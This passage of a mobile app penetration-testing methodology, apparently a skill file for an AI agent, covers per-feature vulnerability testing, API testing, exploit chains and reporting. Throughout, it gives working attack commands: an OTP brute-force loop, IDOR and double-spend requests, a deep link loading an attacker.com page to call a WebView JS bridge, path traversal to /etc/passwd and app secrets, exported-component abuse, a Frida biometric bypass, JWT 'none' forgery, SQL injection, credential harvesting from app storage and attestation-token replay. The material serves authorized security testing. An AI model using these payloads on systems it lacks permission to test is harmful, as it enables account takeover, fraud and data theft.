### Gate: All features from Phase 5 attack surface map tested; findings documented per feature

### Methodology

For EACH feature in the attack surface map (Phase 5):
1. Identify entry points (UI, deep links, intents, API calls)
2. Map applicable vulnerability classes (from OWASP Mobile Top 10 + custom)
3. Execute test cases per vuln class
4. Document findings immediately with evidence

This is NOT a flat checklist of vulnerability types. You test **per feature** — the login flow gets auth-specific tests, the payment flow gets business-logic tests, the file upload gets path-traversal tests. Each feature has its own threat model.

### Feature Testing Workflow

```
For each feature in attack-surface-map.md:
  1. Open feature testing file: phase7-vuln-analysis/per-feature/<feature-name>.md
  2. List all entry points for this feature
  3. For each applicable vuln class:
     a. Execute test case
     b. Record result (vulnerable / not vulnerable / inconclusive)
     c. If vulnerable → create finding immediately (MTEST-XXX)
  4. Mark feature as TESTED in attack surface map
```

### Feature Testing Template

Save one file per feature in `phase7-vuln-analysis/per-feature/`:

```markdown
# Feature: [Name] — Vulnerability Analysis

**Risk Priority:** Critical|High|Medium|Low (from Phase 5)
**Entry Points:**
- UI: [path to screen]
- API: [endpoints]
- Deep Link: [scheme://path]
- Intent: [action/component]

## Test Matrix

| Vuln Class | Test Case | Result | Finding |
|-----------|-----------|--------|---------|
| Brute Force | 100 login attempts, check lockout | Not Vuln | — |
| OTP Bypass | Reuse OTP, expired OTP, null OTP | Vulnerable | MTEST-003 |
| Session Fixation | Pre-set session token before auth | Not Vuln | — |
| Token Leakage | Check logcat, analytics, clipboard | Vulnerable | MTEST-004 |
| ... | | | |

## Notes
[Observations, partial findings, things to revisit in Phase 9]
```

### Execution Procedures (top 10 mobile vulns)

**1. IDOR (most common High+ finding):**
```bash
# Capture a request with your user ID (from Phase 4 traffic)
# In Burp Repeater: swap your ID with another user's ID
# Test: account number, user ID, transaction ID, document ID
curl -s "$BASE/api/user/profile?id=VICTIM_ID" -H "Authorization: Bearer $MY_TOKEN"
# If you get victim's data → IDOR confirmed
# Also test: sequential IDs (id=1001 → id=1002), UUID enumeration, negative IDs
```

**2. OTP Bypass:**
```bash
# a) Null OTP: send empty or "000000"
curl -s "$BASE/auth/verify-otp" -d '{"otp":""}' -H "Authorization: Bearer $TOKEN"
# b) Reuse: use same OTP twice
# c) Expired: wait past TTL, resend same OTP
# d) Race condition: send 2 verify requests simultaneously with same OTP
# e) Brute force: if no rate limit, try all 6-digit codes (needs automation)
for i in $(seq 100000 999999); do
  curl -s "$BASE/auth/verify-otp" -d "{\"otp\":\"$i\"}" -H "Auth: Bearer $TOKEN" | grep -q "success" && echo "FOUND: $i" && break
done
```

**3. Race Condition (double-spend):**
```bash
# Prepare N identical transfer requests, fire simultaneously
# Using GNU parallel:
seq 1 10 | parallel -j10 "curl -s '$BASE/transfer' -d '{\"amount\":100,\"to\":\"ACCT\"}' -H 'Auth: Bearer $TOKEN'"
# Or Burp Turbo Intruder / Repeater "Send group in parallel"
# Check: did balance decrease by 100 or 1000? Did recipient get 1x or 10x?
```

**4. Deep Link → WebView Hijack:**
```bash
# From Phase 2: identified deep link that loads URL in WebView
adb shell am start -a android.intent.action.VIEW -d "appscheme://webview?url=https://attacker.com/xss.html" <package>
# If WebView loads attacker URL → check for JS bridge methods
# Escalate: inject JS that calls @JavascriptInterface methods
# Example payload (xss.html): <script>AndroidBridge.executeCommand("id")</script>
```

**5. Path Traversal (file read/write):**
```bash
# Via ContentProvider:
adb shell content read --uri "content://<authority>/../../etc/hosts"
# Via deep link file download:
adb shell am start -d "appscheme://download?file=../../../data/data/<pkg>/shared_prefs/secrets.xml" <package>
# Via intent extra:
adb shell am start -n <package>/.FileViewerActivity --es "path" "../../../../etc/passwd"
```

**6. Exported Component Abuse:**
```bash
# Launch non-protected activity directly (skip auth):
adb shell am start -n <package>/.internal.AdminActivity
# Send broadcast to unprotected receiver:
adb shell am broadcast -a <package>.RESET_PIN --es "new_pin" "0000"
# Query exported ContentProvider:
adb shell content query --uri "content://<authority>/users" --projection "name:password"
```

**7. Biometric Bypass (client-side):**
```javascript
// Frida: hook BiometricPrompt callback to always succeed
Java.perform(function() {
  var cb = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
  cb.onAuthenticationSucceeded.implementation = function(result) {
    console.log("[*] Biometric bypassed");
    this.onAuthenticationSucceeded(result);
  };
  cb.onAuthenticationFailed.implementation = function() {
    console.log("[*] Suppressing failure");
  };
});
// If app proceeds without server validation → finding confirmed
```

**8. JWT Manipulation:**
```bash
# Decode JWT: echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
# Test "none" algorithm:
# Header: {"alg":"none","typ":"JWT"} → base64url
# Keep payload, remove signature: header.payload.
curl -s "$BASE/api/me" -H "Authorization: Bearer $NONE_TOKEN"
# Test expired token reuse: use token past exp claim
# Test role escalation: change "role":"user" to "role":"admin"
```

**9. SQL Injection (ContentProvider):**
```bash
# Basic test:
adb shell content query --uri "content://<authority>/items" --where "1=1) OR 1=1--"
# Extract data:
adb shell content query --uri "content://<authority>/items" --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"
# If app crashes or returns unexpected data → SQLi confirmed
```

**10. Insecure Data Storage:**
```bash
# Pull all app data (rooted):
adb shell "su -c 'tar czf /sdcard/appdata.tar.gz /data/data/<package>/'"
adb pull /sdcard/appdata.tar.gz
tar xzf appdata.tar.gz
# Check SharedPrefs for tokens/PII:
grep -riE "token|jwt|password|pin|account" data/data/<package>/shared_prefs/
# Check databases:
sqlite3 data/data/<package>/databases/*.db ".dump" | grep -iE "password|token|secret"
# Check Hive (Flutter):
strings data/data/<package>/app_flutter/*.hive | grep -iE "bearer|jwt|refresh"
```

---

### Vulnerability Classes Checklist (apply per-feature)

**Authentication & Session:**
- Brute force / rate limiting bypass
- Credential stuffing
- Session fixation / session hijacking
- Token leakage (logs, analytics, clipboard, URL params)
- Biometric bypass (client-side only check)
- OTP bypass (reuse, expiry, null, race condition)
- Password reset flow abuse
- Remember-me token weakness

**Authorization:**
- IDOR (swap user IDs, account numbers, resource IDs)
- Privilege escalation (user → admin, free → premium)
- Missing function-level access control
- Insecure direct object reference via deep links

**Input Validation:**
- SQL injection (API params, content provider queries)
- NoSQL injection (MongoDB operators in JSON)
- Command injection (native libs, server-side)
- YAML/XML deserialization (SnakeYAML, XMLDecoder)
- Path traversal (file operations, content providers)
- XSS via WebView (stored in fields, reflected via deep links)
- Intent injection (exported components, parseUri)

**Business Logic:**
- Race conditions (double-spend, parallel requests)
- Negative values (transfer negative amount)
- Step skipping (skip OTP, skip terms acceptance)
- Replay attacks (reuse transaction tokens)
- Coupon/promo abuse (reuse, negative discount)
- Time-of-check-time-of-use (TOCTOU)

**Data Protection:**
- Insecure local storage (plaintext tokens, PII in SharedPrefs)
- Clipboard leakage (sensitive data copied)
- Logging sensitive data (logcat, analytics)
- Backup exposure (allowBackup, custom backup without encryption)
- Screenshot/screen recording on sensitive screens
- Cache/temp file exposure

**Cryptography:**
- Weak algorithms (MD5, SHA1 for security, DES, RC4)
- Hardcoded keys/secrets
- Small keyspace (4-digit PIN protecting data)
- ECB mode usage
- Missing integrity protection (encryption without MAC)
- Predictable IV/nonce

**Network:**
- Cleartext traffic (HTTP, missing usesCleartextTraffic=false)
- Missing/incomplete SSL pinning
- Certificate validation bypass
- WebSocket without TLS
- DNS rebinding

**Platform (Mobile-specific):**
- Exported components without permission (activities, receivers, providers, services)
- Deep link injection / hijacking
- WebView JavaScript bridge attacks
- Intent redirection / hijacking
- Pending intent mutable flags
- Task affinity hijacking
- Tapjacking (overlay attacks)

### Per-Feature Vuln Class Mapping (Quick Reference)

| Feature Type | Primary Vuln Classes |
|-------------|---------------------|
| Login/Auth | Brute force, OTP bypass, biometric bypass, session fixation, credential stuffing |
| Payment/Transfer | IDOR, race condition, negative amount, replay, step skipping |
| Profile/Account | IDOR, PII exposure, file upload vulns, XSS via fields |
| File Upload/Download | Path traversal, unrestricted type, size bypass, malware upload |
| Chat/Messaging | XSS, injection, media handling, deep link abuse |
| Search | Injection, information disclosure, enumeration |
| Settings | Privilege escalation, insecure defaults, missing re-auth |
| Deep Links (all) | Intent injection, WebView hijack, parameter tampering, open redirect |
| Content Providers | SQL injection, path traversal, permission bypass |
| Push Notifications | Spoofing, data leakage in payload, deep link injection |

---

## Phase 8: API Testing (Server-side)

### Gate: at least BOLA, auth bypass, and injection tests completed (OR documented N/A with justification if no server-side API exists)

**Delegation to atest:** Phase 8 focuses on mobile-API-specific patterns (attestation replay, device-bound tokens, mobile headers). For comprehensive API testing (full BOLA sweep, injection matrix, business logic), invoke `atest` with the API surface mapped in Phase 4. Pass:
- Base URLs from traffic capture
- Auth mechanism (JWT + attestation token structure)
- API type (REST/GraphQL/gRPC)
- Any rate limit observations from Phase 4

**Mobile-API-specific patterns (test these HERE, not in atest):**
- Device attestation token replay (Eversafe, Play Integrity, AppAttest)
- Mobile-specific headers manipulation (`x-device-id`, `x-app-version`, `x-platform`, `x-cuid`)
- App version downgrade — older API versions may lack attestation checks
- Push notification token theft → impersonate device
- Device registration endpoint abuse (register multiple devices, steal sessions)
- Certificate pinning bypass → capture tokens that are normally invisible to proxy

**Eversafe/attestation-protected APIs — partial unblock workflow:**

When direct API replay is blocked by device attestation tokens (Eversafe, AppAttest, etc.), use this time-boxed approach:

1. **Keep the app active** with proxy intercepting traffic (SSL bypass + iptables)
2. **Capture fresh tokens** from Burp: both the attestation token and JWT/session token
3. **Immediately replay** with curl within the JWT TTL window (typically 5 min for banking apps):
   ```bash
   # Extract latest tokens from Burp MCP
   EVERSAFE=$(grep -oP 'x-eversafe-verification-token: \K.*' /tmp/latest_request.txt)
   JWT=$(grep -oP 'Bearer \K[^ ]+' /tmp/latest_request.txt)
   
   # Replay with modified parameters (IDOR test)
   curl -s "https://stg-api.example.com/account/accounts?include=balance" \
     -H "authorization: Bearer $JWT" \
     -H "x-eversafe-verification-token: $EVERSAFE" \
     -H "x-device-id: <device_id>" \
     -H "x-cuid: OTHER_CUSTOMER_ID"
   ```
4. **Automate capture-and-replay** if testing multiple endpoints — script the Burp MCP token extraction
5. **Document the constraint** in the report: "API testing performed within 5-min JWT windows using replayed attestation tokens"

If the attestation token itself expires before you can test (< 5 min validity), mark Phase 8 as N/A with justification. The token replay window is the practical limit of what's testable without RE of the native attestation library.

**Steps (mobile-specific only — delegate general API testing to atest):**

1. **Device attestation replay:**
   - Capture attestation token (Eversafe, Play Integrity, AppAttest) from proxy
   - Replay within JWT TTL window (typically 5 min for banking apps)
   - Test if attestation token is bound to specific request or reusable across endpoints
   - Check if token expiry is shorter than JWT expiry (limits testing window)

2. **Mobile header manipulation:**
   - Remove/swap `x-device-id` — does server enforce device binding?
   - Downgrade `x-app-version` — do older versions skip attestation checks?
   - Change `x-platform` (android→ios, ios→android) — different validation paths?
   - Swap `x-cuid` / customer ID headers — IDOR via header (not body/path)

3. **App version downgrade:**
   - Find older API base paths (v1, v2 vs current v3) from static analysis
   - Test if older endpoints still respond without attestation
   - Check if deprecated endpoints expose more data or skip auth checks

4. **Device registration abuse:**
   - Register multiple devices to same account — does it invalidate previous sessions?
   - Steal push notification token → impersonate device for server-push
   - Test device limit enforcement (register 100 devices, check if old ones are revoked)

5. **Attestation-free endpoints:**
   - Map which endpoints require attestation vs which don't (compare headers across captured requests)
   - Pre-auth endpoints (login, register, forgot-password) often skip attestation — test these for injection/logic bugs directly
   - Health/status/config endpoints may leak internal info without attestation

**Delegation to atest:** For comprehensive BOLA/IDOR sweep, injection matrix, auth bypass, business logic, and rate limiting — invoke `atest` with:
- Base URLs from Phase 4 traffic capture
- Auth mechanism (JWT structure, attestation token format)
- API type (REST/GraphQL/gRPC)
- Rate limit observations from Phase 4
- Any endpoints that work without attestation (test these first in atest)

**Cross-reference:** Load `atest` skill for full API testing methodology. Load ptest `references/geo-restriction-bypass.md` if API is geo-blocked.

---

## Phase 9: Exploitation & Validation

### Gate: All Critical/High findings have exploitation proof OR documented limitation why validation wasn't possible

This phase separates "finding a bug" from "proving exploitability." Every Critical/High finding from Phases 6-8 must have a complete exploit chain demonstrated here.

**Steps:**

1. **Build exploit chains** — for each Critical/High finding:
   - Write complete PoC script (Python, Frida, or adb commands)
   - Demonstrate full impact (data exfil, account takeover, RCE, financial loss)
   - Chain findings where applicable (e.g., deep link + WebView + JS bridge = RCE)
   - Document prerequisites (rooted device, specific app state, user interaction)

2. **Production validation:**
   - Test on non-rooted production device where possible
   - Confirm finding works without instrumentation (Frida, root)
   - If can't validate on production: document limitation, cap at High (Probable)
   - Test with real user account (not just static code evidence)

3. **Chain analysis:**
   - Look for combinations that escalate severity:
     - Info leak + IDOR = account takeover
     - Deep link injection + WebView + JS bridge = RCE
     - Path traversal + native lib loading = code execution
     - Backup manipulation + deserialization = RCE
   - Document attack chains as separate findings with combined severity

4. **Evidence collection:**
   - Screenshots/screen recordings of exploitation
   - Network captures (pcap/HAR) showing the attack
   - Frida output logs proving code execution
   - PoC scripts that reproduce from scratch (zero-knowledge)
   - Before/after state comparison (e.g., balance change, data access)

5. **PoC requirements:**
   - Self-contained (runs without manual setup beyond stated prerequisites)
   - Documented dependencies (Python packages, Frida version, device requirements)
   - Clear success criteria (what output proves exploitation)
   - Cleanup instructions (if PoC modifies state)

**Output:** `phase9-exploitation/` directory with:
- `poc/MTEST-XXX-poc.py` — PoC scripts per finding
- `evidence/MTEST-XXX/` — screenshots, logs, captures per finding
- `chains.md` — documented attack chains

**Reference:** `android-path-traversal-rce.md`, `native-buffer-overflow.md`, `crypto-key-cracking.md`

---

## Phase 10: Reporting

### Gate: All findings documented, severity validated, report generated

**Steps:**

1. Compile findings with:
   - Title and severity (Critical/High/Medium/Low/Info)
   - Affected component (client/server/both)
   - Platform (Android/iOS/both)
   - Steps to reproduce (with screenshots/video)
   - Impact statement
   - Remediation recommendation
   - OWASP Mobile Top 10 mapping

2. Generate report.md with:
   - Executive summary
   - Scope and methodology
   - Findings table (sorted by severity)
   - Detailed findings
   - Attack chain diagram (how findings combine)
   - Remediation roadmap (prioritized)
   - Appendix: tool versions, device info, test dates

3. Generate exploitation-walkthrough.md (CTF/lab contexts, or when client requests):
   - Step-by-step reproduction from APK to full exploitation
   - Include all commands, scripts, and code needed to reproduce
   - Structure: identify target → reverse logic → build exploit → execute → verify
   - Include cracking scripts (Python) for any brute-forced secrets
   - Include PoC code (malicious app, Frida script, or adb commands)
   - Target audience: someone who has never seen the app before

---

## Finding Template

```markdown
# MTEST-XXX: [Title]

**Severity:** Critical|High|Medium|Low|Info
**Confidence:** Confirmed|Probable|Theoretical
**Platform:** Android|iOS|Both
**Component:** Client|Server|Both
**OWASP Mobile:** M1-M10 mapping
**MASVS v2:** MASVS-STORAGE|MASVS-CRYPTO|MASVS-AUTH|MASVS-NETWORK|MASVS-PLATFORM|MASVS-CODE|MASVS-RESILIENCE|MASVS-PRIVACY
**Feature:** [Which feature from attack surface map]

## Description
[What the vulnerability is]

## Confidence Justification
[Why this confidence level — what was verified vs assumed]

## Steps to Reproduce
1. ...
2. ...
3. ...

## Evidence
[Screenshots, request/response, Frida output]

## Impact
[What an attacker can achieve]

## Remediation
[How to fix it]
```

### Finding Confidence Levels

| Level | Meaning | Bug Bounty Expectation |
|-------|---------|----------------------|
| **Confirmed** | Exploited dynamically on production build (non-rooted, logged-in user) | Full payout, Critical/High accepted |
| **Probable** | Code path proven + partial dynamic evidence (e.g., intent accepted, activity launched) but full chain not demonstrated | Reduced payout, may be downgraded |
| **Theoretical** | Code path exists in decompiled source but blocked by runtime condition (feature flag, server config, auth gate) that couldn't be verified | Often Informational/Won't Fix unless code evidence is compelling |

**Rules:**
- Never rate a finding Critical with Theoretical confidence
- Probable + Critical code path = submit as High
- Theoretical findings must explicitly state what runtime condition blocks exploitation
- If you can't distinguish Confirmed from Theoretical (e.g., can't test on non-rooted device), state that limitation

---

## Severity Guidelines (Mobile-specific)

| Severity | Examples |
|----------|----------|
| Critical | Hardcoded credentials with server access, RCE via WebView, auth bypass exposing all accounts |
| High | SSL pinning absent on banking app, plaintext token storage, BOLA on financial endpoints |
| Medium | Missing root detection, exported activities with sensitive data, weak crypto |
| Low | Missing screenshot protection, clipboard exposure, verbose logs |
| Info | Missing obfuscation, outdated SDK versions, unused permissions |

---

## Operational Notes

**Full operational notes moved to `references/operational-notes.md`.** Load with `skill_view(name='mtest', file_path='references/operational-notes.md')` when you hit a specific problem.

**Cross-skill triggers from mtest:**
- API endpoints discovered in traffic → invoke `atest` for structured AuthN/AuthZ testing
- Cloud storage URLs (S3/GCS) in app config or traffic → invoke `ctest` Phase 3
- Web endpoints found → feed back into `ptest` findings-log
- Hardcoded secrets/source code in APK → invoke `scode` for review
- Smart contract/Web3 SDK in app → invoke `w3hunt`
- API geo-blocked from your location → see ptest `references/geo-restriction-bypass.md`
- Large app static analysis (50K+ classes) → delegate Phase 2 to subagent via `delegate_task`

